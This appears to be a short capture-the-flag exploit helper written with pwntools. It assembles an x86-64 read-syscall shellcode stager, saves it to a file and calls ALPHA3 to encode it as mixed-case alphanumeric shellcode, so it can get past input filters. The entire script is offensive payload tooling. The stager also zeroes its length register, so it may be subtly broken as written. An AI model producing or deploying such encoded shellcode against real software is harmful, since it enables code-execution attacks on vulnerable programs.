from pwn import *
context.arch='amd64'

sh = '''
xor rax,rax
mov rsi,rdx
xor rdi,rdi
xor rdx,rdx
syscall
'''
sh = asm(sh)
with open("shell",'wb+') as f:
    f.write(sh)

import os
os.system('python2 ./ALPHA3.py x64 ascii mixedcase rdx --input="shell"')